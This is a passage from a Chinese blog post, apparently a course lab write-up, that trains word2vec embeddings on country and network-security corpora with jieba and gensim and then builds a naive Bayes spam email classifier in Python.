<p>​    “话筒”表示为 [0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 …]</p>
<p>​    “麦克”表示为 [0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 …]</p>
<p>每个词都是茫茫 0 海中的一个 1。</p>
<p>！但是这种简单的方法有两个缺点：<br>     1.维数灾难<br>     2.“词汇鸿沟”现象：任意两个词之间都是孤立的，无法判断像“话筒”和“麦克”是同义词。</p>
<p>所以，我们需要词向量表示</p>
<p>新的词表示方法叫做<strong>Distributed Representation</strong>（分布式表示）。</p>
<p>这种方法表示词即用一个地位实数向量来表示一个词，如：[0.792, −0.177, −0.107, 0.109, −0.542, …]</p>
<p>语言进行词向量化，可使用<strong>Word2Vec</strong>。</p>
<p>word2vec是google的一个开源工具，能够根据输入的词的集合计算出词与词之间的距离。</p>
<p>它将term转换成向量形式，可以把对文本内容的处理简化为向量空间中的向量运算。</p>
<p>计算出向量空间上的相似度，来表示文本语义上的相似度。</p>
<p>word2vec计算的是余弦值，<strong>距离范围为0-1</strong>之间，值越大代表两个词关联度越高。</p>
<p><strong>安装</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#安装带mkl的版本，下载wheel文件</span><br><span class="line">http:&#x2F;&#x2F;www.lfd.uci.edu&#x2F;~gohlke&#x2F;pythonlibs</span><br><span class="line">#定位到存放.whl文件的文件夹，通过匹配安装对应版本的numpy 和scipy</span><br><span class="line">pip install numpy-1.12.1+mkl-cap36</span><br><span class="line">#安装完后，继续安装genism</span><br><span class="line">pip install -U gensim</span><br></pre></td></tr></table></figure>

<p>为了减少安装中的繁琐，直接在anaconda进行集中安装，安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install gensim</span><br></pre></td></tr></table></figure>

<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="1-分词-1"><a href="#1-分词-1" class="headerlink" title="1.分词"></a>1.分词</h3><p>代码如下，主要的都写了注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> jieba.analyse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义词典</span></span><br><span class="line">jieba.load_userdict(<span class="string">"dict_all.txt"</span>)</span><br><span class="line"><span class="comment"># 读入语料库并且分词</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file_cut</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 语料库路径</span></span><br><span class="line">    pathBaidu = <span class="string">"BaiduSpiderCountry\\"</span></span><br><span class="line">    <span class="comment"># 分词结果</span></span><br><span class="line">    resName = <span class="string">"Result_Country.txt"</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(resName):</span><br><span class="line">        os.remove(resName)</span><br><span class="line">    result = codecs.open(resName, <span class="string">'w'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> num &lt;= <span class="number">100</span>:  <span class="comment"># 5A 200 其它100</span></span><br><span class="line">        name = <span class="string">"%04d"</span> % num   <span class="comment">#文件遍历格式：0001-&gt;0100</span></span><br><span class="line">        fileName = pathBaidu + str(name) + <span class="string">".txt"</span>  <span class="comment">#</span></span><br><span class="line">        source = open(fileName, <span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>)  <span class="comment">#打开文件</span></span><br><span class="line">        line = source.readline()     <span class="comment">#获得line迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> line != <span class="string">""</span>:</span><br><span class="line">            line = line.rstrip(<span class="string">'\n'</span>)  <span class="comment"># 删除string字符串末尾的指定字符</span></span><br><span class="line">            seglist = jieba.cut(line, cut_all=<span class="literal">False</span>)  <span class="comment"># 精确模式</span></span><br><span class="line">            output = <span class="string">' '</span>.join(list(seglist))  <span class="comment"># 空格拼接，将元组转换为列表，元组是括号，列表是方括号</span></span><br><span class="line">            result.write(output + <span class="string">' '</span>)  <span class="comment"># 空格取代换行'\r\n'</span></span><br><span class="line">            line = source.readline()   <span class="comment">#下一line</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'End file: '</span> + str(num))  <span class="comment">#line为空，这个文件遍历结束</span></span><br><span class="line">            result.write(<span class="string">'\r\n'</span>)  <span class="comment">#换行'\r\n'</span></span><br><span class="line">            source.close()        <span class="comment">#关闭源</span></span><br><span class="line">        num = num + <span class="number">1</span>  <span class="comment">#下一个文件</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'End BaiduSpiderCountry cut：'</span>+str(num)) <span class="comment"># 结束百度语料库分词</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run function</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    read_file_cut()</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/chenj_freedom/article/details/81184296?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">换行格式：</a></p>
<p>1、文档是windows格式，当我们按下键盘上的“回车键”时，输出的是CR和LF，即0d，0a两个字符。<br>2、文档是unix格式，当我们按下键盘上的“回车键”时，输出的LF，即0a一个字符。<br>3、文档是mac模式，当我们按下键盘上的“回车键”时，输出的是CR，即0d一个字符。</p>
<p>运行~</p>
<p>成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409184925832.png" alt="image-20200409184925832"></p>
<p>分词结果如下</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409184959263.png" alt="image-20200409184959263"></p>
<h3 id="1-词向量化"><a href="#1-词向量化" class="headerlink" title="1.词向量化"></a>1.词向量化</h3><p>代码如下，主要的都写了注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gensim.models <span class="keyword">import</span> word2vec</span><br><span class="line"><span class="keyword">import</span>  logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化配置</span></span><br><span class="line">logging.basicConfig(format=<span class="string">'%(asctime)s : %(levelname)s : %(message)s'</span>, level=logging.INFO)</span><br><span class="line"><span class="comment"># 加载语料</span></span><br><span class="line">sentences = word2vec.Text8Corpus(<span class="string">"Result_Country.txt"</span>)</span><br><span class="line"><span class="comment"># 训练模型,维度设置为200;</span></span><br><span class="line">model = word2vec.Word2Vec(sentences, size=<span class="number">200</span>) </span><br><span class="line"></span><br><span class="line">print(<span class="string">"阿富汗的词向量："</span>)</span><br><span class="line">print(model[<span class="string">'阿富汗'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"争端、冲突这两个词的相关程度："</span>)</span><br><span class="line">y1 = model.similarity(<span class="string">"争端"</span>,<span class="string">"冲突"</span>)</span><br><span class="line">print(y1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"输出与“地区”相关度最高的20 个词："</span>)</span><br><span class="line">y2 = model.most_similar(<span class="string">"地区"</span>, topn=<span class="number">20</span>)</span><br><span class="line">print(y2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"法官 总统 部长 北纬 这四个词中最“不合群”的词"</span>)</span><br><span class="line">y4 = model.doesnt_match(<span class="string">"法官 总统 部长 北纬"</span>.split())</span><br><span class="line">print(y4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存模型</span></span><br><span class="line">model.save(<span class="string">"国家.model"</span>)</span><br><span class="line"><span class="comment"># 读取模型</span></span><br><span class="line"><span class="comment"># model_2 = word2vec.Word2Vec.load("国家.model")</span></span><br></pre></td></tr></table></figure>

<p>运行</p>
<p>模型跑成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409190406516.png" alt="image-20200409190406516"></p>
<ul>
<li>阿富汗的词向量，一个200维的数：</li>
</ul>
<p>​    <img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192647571.png" alt="image-20200409192647571"></p>
<ul>
<li>争端、冲突这两个词的相关程度：</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192713430.png" alt="image-20200409192713430"></p>
<ul>
<li>输出与“地区”相关度最高的20 个词：</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192810184.png" alt="image-20200409192810184"></p>
<ul>
<li>法官 总统 部长 北纬 这四个词中最“不合群”的词</li>
</ul>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409192855779.png" alt="image-20200409192855779"></p>
<p>保存模型</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409193001889.png" alt="image-20200409193001889"></p>
<h1 id="实验1-2-自选词典数据语料库"><a href="#实验1-2-自选词典数据语料库" class="headerlink" title="实验1.2-自选词典数据语料库"></a>实验1.2-自选词典数据语料库</h1><h2 id="1-选择词典数据语料库"><a href="#1-选择词典数据语料库" class="headerlink" title="1.选择词典数据语料库"></a>1.选择词典数据语料库</h2><ul>
<li>在词典方面，我用<a href="https://pinyin.sogou.com/dict/" target="_blank" rel="noopener">搜狗的细胞词库</a><ul>
<li>下载网络安全词典，使用<a href="http://tools.bugscaner.com/sceltotxt/" target="_blank" rel="noopener">搜狗细胞词库转txt工具</a></li>
<li><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180255840.png" alt="image-20200411180255840"></li>
</ul>
</li>
<li>在语料库方面，我选择<a href="http://bcc.blcu.edu.cn/" target="_blank" rel="noopener">BBC语料库</a><ul>
<li>如图，在科技板块，搜索相关关键词</li>
<li><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180437845.png" alt="image-20200411180437845"></li>
<li>大概搜索了五个关键词（如病毒、蠕虫、网络安全等）。</li>
<li>然后根据其语料集存在的问题，进行数据清洗</li>
</ul>
</li>
</ul>
<p>选择词典数据语料库的结果如下</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411180819848.png" alt="image-20200411180819848"></p>
<h2 id="2-分词"><a href="#2-分词" class="headerlink" title="2.分词"></a>2.分词</h2><p>代码与第一个实验基本一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security_cut</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 导入自定义词典</span></span><br><span class="line">    jieba.load_userdict(<span class="string">"security_dict.txt"</span>)</span><br><span class="line">    <span class="comment"># 语料库路径</span></span><br><span class="line">    pathBaidu = <span class="string">"security\\"</span></span><br><span class="line">    <span class="comment"># 分词结果</span></span><br><span class="line">    resName = <span class="string">"Result_Security.txt"</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(resName):</span><br><span class="line">        os.remove(resName)</span><br><span class="line">    result = codecs.open(resName, <span class="string">'w'</span>, <span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> num &lt;= <span class="number">5</span>:  <span class="comment"># 5A 200 其它100</span></span><br><span class="line">        name = <span class="string">"%d"</span> % num   <span class="comment">#文件遍历格式：0001-&gt;0100</span></span><br><span class="line">        fileName = pathBaidu + str(name) + <span class="string">".txt"</span></span><br><span class="line">        source = open(fileName, <span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>)  <span class="comment">#打开文件</span></span><br><span class="line">        line = source.readline()     <span class="comment">#获得line迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> line != <span class="string">""</span>:</span><br><span class="line">            line = line.rstrip(<span class="string">'\n'</span>)  <span class="comment"># 删除string字符串末尾的指定字符</span></span><br><span class="line">            seglist = jieba.cut(line, cut_all=<span class="literal">False</span>)  <span class="comment"># 精确模式</span></span><br><span class="line">            output = <span class="string">' '</span>.join(list(seglist))  <span class="comment"># 空格拼接，将元组转换为列表，元组是括号，列表是方括号</span></span><br><span class="line">            result.write(output + <span class="string">' '</span>)  <span class="comment"># 空格取代换行'\r\n'</span></span><br><span class="line">            line = source.readline()   <span class="comment">#下一line</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'End Security file: '</span> + str(num))  <span class="comment">#line为空，这个文件遍历结束</span></span><br><span class="line">            result.write(<span class="string">'\r\n'</span>)  <span class="comment">#换行'\r\n'</span></span><br><span class="line">            source.close()        <span class="comment">#关闭源</span></span><br><span class="line">        num = num + <span class="number">1</span>  <span class="comment">#下一个文件</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'End Security cut'</span>) <span class="comment"># 结束百度语料库分词</span></span><br><span class="line"><span class="comment"># Run function</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    security_cut()</span><br></pre></td></tr></table></figure>

<h2 id="3-词向量化"><a href="#3-词向量化" class="headerlink" title="3.词向量化"></a>3.词向量化</h2><p>代码与第一个实验基本一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This Python file uses the following encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> gensim.models <span class="keyword">import</span> word2vec</span><br><span class="line"><span class="keyword">import</span>  logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化配置</span></span><br><span class="line">logging.basicConfig(format=<span class="string">'%(asctime)s : %(levelname)s : %(message)s'</span>, level=logging.INFO)</span><br><span class="line"><span class="comment"># 加载语料</span></span><br><span class="line">sentences = word2vec.Text8Corpus(<span class="string">"Result_Security.txt"</span>)</span><br><span class="line"><span class="comment"># 训练模型,维度设置为200;</span></span><br><span class="line">model = word2vec.Word2Vec(sentences, size=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒的词向量，一个200维的数："</span>)</span><br><span class="line">print(model[<span class="string">'病毒'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒、木马这两个词的相关程度："</span>)</span><br><span class="line">y1 = model.similarity(<span class="string">"病毒"</span>,<span class="string">"木马"</span>)</span><br><span class="line">print(y1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"输出与“网络安全”相关度最高的20 个词："</span>)</span><br><span class="line">y2 = model.most_similar(<span class="string">"网络安全"</span>, topn=<span class="number">20</span>)</span><br><span class="line">print(y2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"病毒 木马 诺顿 蠕虫 这四个词中最“不合群”的词"</span>)</span><br><span class="line">y4 = model.doesnt_match(<span class="string">"病毒 木马 诺顿 蠕虫"</span>.split())</span><br><span class="line">print(y4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存模型</span></span><br><span class="line">model.save(<span class="string">"网络安全.model"</span>)</span><br><span class="line"><span class="comment"># 读取模型</span></span><br><span class="line"><span class="comment"># model_2 = word2vec.Word2Vec.load("国家.model")</span></span><br></pre></td></tr></table></figure>

<p>词向量模型训练成功，测试的结果如下</p>
<ul>
<li><p>病毒的词向量，一个200维的数：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181124453.png" alt="image-20200411181124453"></p>
</li>
<li><p>病毒、木马这两个词的相关程度：0.9492484</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181203044.png" alt="image-20200411181203044"></p>
</li>
<li><p>输出与“网络安全”相关度最高的20 个词：</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181231329.png" alt="image-20200411181231329"></p>
</li>
<li><p>病毒 木马 诺顿 蠕虫 这四个词中最“不合群”的词：诺顿</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200411181303308.png" alt="image-20200411181303308"></p>
</li>
</ul>
<p>#coding = gbk</p>
<h1 id="实验2-垃圾邮件的分类"><a href="#实验2-垃圾邮件的分类" class="headerlink" title="实验2-垃圾邮件的分类"></a>实验2-垃圾邮件的分类</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="1-文本分类"><a href="#1-文本分类" class="headerlink" title="1.文本分类"></a>1.文本分类</h3><p>文本分类就是在给定的分类体系下,让计算机根据给定文本的内容，将其判</p>
<p>别为事先确定的若干个文本类别中的某一类或某几类的过程。</p>
<p>一般来说，文本分类可以分为一下过程：</p>
<p>（1） 预处理：将原始语料格式化为同一格式，便于后续的统一处理；</p>
<p>（2） 索引：将文档分解为基本处理单元，同时降低后续处理的开销；</p>
<p>（3） 统计：词频统计，项（单词、概念）与分类的相关概率；</p>
<p>（4） 特征抽取：从文档中抽取出反映文档主题的特征；</p>
<p>（5） 分类器：分类器的训练；</p>
<p>（6） 评价：分类器的测试结果分析。</p>
<p>典型的分类算法包括Rocchio算法、朴素贝叶斯分类算法、K-近邻算法、决</p>
<p>策树算法、神经网络算法和支持向量机算法等。 </p>
<h3 id="2-朴素贝叶斯分类算法"><a href="#2-朴素贝叶斯分类算法" class="headerlink" title="2.朴素贝叶斯分类算法"></a>2.朴素贝叶斯分类算法</h3><p>根据贝叶斯定理，利用先验概率和条件概率估算后验概率：</p>
<p>先验概率：事情还没有发生,那么这件事情发生的可能性的大小。</p>
<p>后验概率：事情已经发生,那么这件事情发生的原因是由某个因素引起的可能性的大小。</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416153013132.png" alt="image-20200416153013132"></p>
<p>将该算法代入我们的垃圾邮件分类任务中之后，理论如下：</p>
<h4 id="1-概率计算"><a href="#1-概率计算" class="headerlink" title="(1).概率计算"></a>(1).概率计算</h4><p>假设c0是正常邮件，c1是垃圾邮件。<code>𝑝(𝑐0)</code>表示在邮件数据集中，正常邮件的概率，<code>𝑝(𝑐1)</code>则表示垃圾邮件的概率，所以计数之后除以邮件总数即可。</p>
<p>x与y分别是邮件的两个特征，那么，当邮件有x和y两个特征时（因为两个概率的分母完全一样，因此在比较两者大小时可忽略分母。）</p>
<ul>
<li><p>为正常邮件的概率为<code>𝑝(𝑐0/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c0)*p(c0)</code> </p>
</li>
<li><p>为垃圾邮件的概率为<code>𝑝(𝑐1/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c1)*p(c1)</code> </p>
</li>
</ul>
<h4 id="2-“朴素”——引入条件独立性假设"><a href="#2-“朴素”——引入条件独立性假设" class="headerlink" title="(2).“朴素”——引入条件独立性假设"></a>(2).“朴素”——引入条件独立性假设</h4><p>x和y的条件概率相互独立。𝑝(𝑥/𝑐𝑖)和𝑝(𝑦/𝑐𝑖)可以对数据进行计数而直接得出。</p>
<p>则条件概率<code>𝑝(𝑥, 𝑦/ci)=𝑝(𝑥/c0)*𝑝(𝑦/ci)</code></p>
<p>即上述公式为<code>𝑝(𝑐0/𝑥, 𝑦) =𝑝(𝑥, 𝑦/c0)*𝑝(c0)=𝑝(𝑥/c0)*𝑝(𝑦/ci)*p(c0)</code> </p>
<h4 id="3-假设每个样本至少出现一次"><a href="#3-假设每个样本至少出现一次" class="headerlink" title="(3).假设每个样本至少出现一次"></a>(3).假设每个样本至少出现一次</h4><p>由于条件独立性假设，需要对条件概率进行乘法运算，若某个样本不出现，即概率为0，则最后结果也为0。所以假设每个样本至少出现一次。</p>
<h4 id="4-将全部乘法运算改为log运算"><a href="#4-将全部乘法运算改为log运算" class="headerlink" title="(4).将全部乘法运算改为log运算"></a>(4).将全部乘法运算改为log运算</h4><p>在实际运算中，条件概率可能会很小，即接近于0，那么在乘法运算中很可能会有下溢出的问题。</p>
<h3 id="3-实际的编码流程"><a href="#3-实际的编码流程" class="headerlink" title="3.实际的编码流程"></a>3.实际的编码流程</h3><p>在本实验中，实际的编码时，我们所需要做的事按顺序排列的如下：</p>
<ol>
<li><p>网上选择一些中文常用的停用词。</p>
</li>
<li><p>读入spam（恶意）、ham（正常）邮件，用jieba.cut()分词，并且去除停用词，保存。</p>
</li>
<li><p>用jieba.analyse.extract_tags()分别提取两个文件的前50（或更多）常见词，合成为一个常见词list，作为我们的特征词向量features。</p>
</li>
<li><p>接下来，对spam、ham的分词结果进行特征词向量features的特征计算：</p>
<ol>
<li>对每一封邮件，其特征词向量features全为1</li>
<li>统计其在features中每个词的出现次数</li>
<li>如果features出现一次，该项就加1</li>
</ol>
</li>
<li><p>根据朴素贝叶斯定理计算spam、ham后验概率spam_vec\ham_vec</p>
</li>
<li><p>计算spam、ham各占总邮件数的概率p_spam、p_ham</p>
</li>
<li><p>计算待测试集的特征集向量test_vec</p>
</li>
<li><p>将<code>test_vec*spam_vec*p_spam</code> 与<code>test_vec*ham_vec*p_ham</code>相比，</p>
</li>
<li><p>哪方概率大则该封测试邮件属于哪一类（为了避免正常邮件分为垃圾邮件，当概率相等时，判定为正常）</p>
</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ol>
<li>网上选择一些中文常用的停用词。</li>
</ol>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200416161709427.png" alt="image-20200416161709427"></p>
<ol start="2">
<li><p>读入spam（恶意）、ham（正常）邮件，用jieba.cut()分词，并且去除停用词，保存。</p>
</li>
<li><p>用jieba.analyse.extract_tags()分别提取两个文件的前50（或更多）常见词，合成为一个常见词list，作为我们的特征词向量features。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_tags_f</span><span class="params">(origin_file_name, target_file_name,number_of_item)</span>:</span></span><br><span class="line">    stop_word_file = <span class="string">"stop_word_list.txt"</span>  <span class="comment"># 停用词txt</span></span><br><span class="line">    stop_word = list()  <span class="comment"># 停用词数组</span></span><br><span class="line">    target_file = open(target_file_name, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>)  <span class="comment"># 提取保存的文件</span></span><br><span class="line">    <span class="keyword">with</span> open(stop_word_file, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> stop_word_file_object:</span><br><span class="line">        contents = stop_word_file_object.readlines()</span><br><span class="line">        <span class="comment"># print(contents)</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> contents:</span><br><span class="line">            line = line.strip()  <span class="comment"># 移除尾部字符</span></span><br><span class="line">            stop_word.append(line)</span><br><span class="line">    <span class="comment"># print(stop_word)</span></span><br><span class="line">    origin_file = origin_file_name <span class="comment">#对文件进行逐行遍历分词</span></span><br><span class="line">    s = <span class="string">""</span> <span class="comment">#没有停顿词的文件中每一行的词串</span></span><br><span class="line">    <span class="keyword">with</span> open(origin_file, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> origin_file_obejct:</span><br><span class="line">        contents = origin_file_obejct.readlines() <span class="comment">#读取</span></span><br><span class="line">        <span class="comment"># print(contents)</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> contents:</span><br><span class="line">            line = line.strip() <span class="comment">#将line去除尾部回车换行</span></span><br><span class="line">            out_line = <span class="string">""</span> <span class="comment">#处理后的line</span></span><br><span class="line">            word_list = jieba.cut(line, cut_all=<span class="literal">True</span>) <span class="comment">#分词成list</span></span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> word_list:  <span class="comment">#将list以空格间隔合并</span></span><br><span class="line">                <span class="keyword">if</span> (word <span class="keyword">not</span> <span class="keyword">in</span> stop_word) <span class="keyword">and</span> (word != <span class="string">"\t"</span>): <span class="comment">#去除停用词</span></span><br><span class="line">                    out_line = out_line + word + <span class="string">" "</span></span><br><span class="line">            s = s + out_line <span class="comment">#没有停顿词的文件中每一行的词串</span></span><br><span class="line">            target_file.write(out_line.strip() + <span class="string">"\n"</span>) <span class="comment">#保存分词文件</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    features = jieba.analyse.extract_tags(s, number_of_item) <span class="comment">#将分词特征提取</span></span><br><span class="line">    <span class="comment"># print(features)</span></span><br><span class="line">    <span class="comment"># print(len(features))</span></span><br><span class="line">    <span class="keyword">return</span> features</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>接下来，对spam、ham的分词结果进行特征词向量features的特征计算：<ol>
<li>对每一封邮件，其特征词向量features全为1</li>
<li>统计其在features中每个词的出现次数</li>
<li>如果features出现一次，该项就加1</li>
</ol>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_vec</span><span class="params">(ham,spam,features)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(ham, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        ham_lines = f1.readlines()</span><br><span class="line">    <span class="keyword">with</span> open(spam, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        spam_lines = f1.readlines()</span><br><span class="line">    list_sum=np.zeros((<span class="number">200</span>,len(features))) <span class="comment">#所有特征词向量，前100为正常邮件，后100为垃圾邮件</span></span><br><span class="line">    list_sum_i=<span class="number">0</span>    <span class="comment">#所有特征词向量的赋值下标i</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ham_lines: <span class="comment">#计算每封正常邮件特征词向量</span></span><br><span class="line">        list_ham = np.ones(len(features)) <span class="comment">#对每一封邮件，其特征词向量features全为1</span></span><br><span class="line">        line = i.split(<span class="string">' '</span>) <span class="comment">#按空格split成一个邮件词list</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)): <span class="comment">#对于features中每个词</span></span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line : <span class="comment">#统计邮件中每个词的出现次数</span></span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature: <span class="comment">#如果features出现一次，该项就加1</span></span><br><span class="line">                    <span class="comment"># print("get")</span></span><br><span class="line">                    list_ham[j]=list_ham[j]+<span class="number">1</span></span><br><span class="line">        list_sum[list_sum_i]=list_ham <span class="comment">#将该封邮件词向量复制给所有特征词向量</span></span><br><span class="line">        list_sum_i +=<span class="number">1</span></span><br><span class="line">    <span class="comment"># print("——————————————————————————————————————————————————————")</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> spam_lines: <span class="comment">#计算垃圾邮件特征词向量</span></span><br><span class="line">        list_spam = np.ones(len(features))</span><br><span class="line">        line = i.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(features)):</span><br><span class="line">            <span class="keyword">for</span> line_feature <span class="keyword">in</span> line :</span><br><span class="line">                <span class="keyword">if</span> features[j] == line_feature:</span><br><span class="line">                    <span class="comment"># print("get")</span></span><br><span class="line">                    list_spam[j]=list_spam[j]+<span class="number">1</span></span><br><span class="line">        list_sum[list_sum_i]=list_spam</span><br><span class="line">        list_sum_i +=<span class="number">1</span></span><br><span class="line">    cate1=[<span class="number">0</span>]*<span class="number">100</span>  <span class="comment">#前面100封邮件正常，后面100封邮件垃圾</span></span><br><span class="line">    cate2=[<span class="number">1</span>]*<span class="number">100</span></span><br><span class="line">    cate=cate1+cate2 <span class="comment">#cate为邮件的类别lsit</span></span><br><span class="line">    <span class="keyword">return</span> list_sum,cate</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>根据朴素贝叶斯定理计算spam、ham后验概率spam_vec\ham_vec</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traing_bayes</span><span class="params">(trainMatrix, trainCategory)</span>:</span>  <span class="comment"># trainMatrix为所有邮件的矩阵表示，trainCategory为表示邮件类别的向量</span></span><br><span class="line">    <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">    numTrainDocs = len(trainMatrix)  <span class="comment"># 邮件总数量</span></span><br><span class="line">    numWords = len(trainMatrix[<span class="number">0</span>])  <span class="comment"># 词典长度</span></span><br><span class="line">    pSpam = sum(trainCategory) / float(numTrainDocs)  <span class="comment"># 统计垃圾邮件的总个数，然后除以总文档个数（先验概率）</span></span><br><span class="line">    p0Num = np.ones(numWords)  <span class="comment"># 将向量初始化为1，表示每个词至少出现1次</span></span><br><span class="line">    p1Num = np.ones(numWords)  <span class="comment"># 同上</span></span><br><span class="line">    p0Denom = <span class="number">2.0</span></span><br><span class="line">    p1Denom = <span class="number">2.0</span>  <span class="comment"># 分母初始化为2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numTrainDocs):</span><br><span class="line">        <span class="keyword">if</span> trainCategory[i] == <span class="number">1</span>:  <span class="comment"># 如果是垃圾邮件</span></span><br><span class="line">            p1Num += trainMatrix[i]  <span class="comment"># 把属于同一类的文本向量相加，实质是统计某个词条在该类文本中出现频率</span></span><br><span class="line">            p1Denom += sum(trainMatrix[i])  <span class="comment"># 把垃圾邮件向量的所有元素加起来，表示垃圾邮件中的所有词汇</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p0Num += trainMatrix[i]</span><br><span class="line">            p0Denom += sum(trainMatrix[i])</span><br><span class="line">    p1 = np.log(p1Num / p1Denom)  <span class="comment"># 统计词典中所有词条在垃圾邮件中出现的概率</span></span><br><span class="line">    p0 = np.log(p0Num / p0Denom)  <span class="comment"># 统计词典中所有词条在正常文邮件中出现的概率</span></span><br><span class="line">    <span class="keyword">return</span> 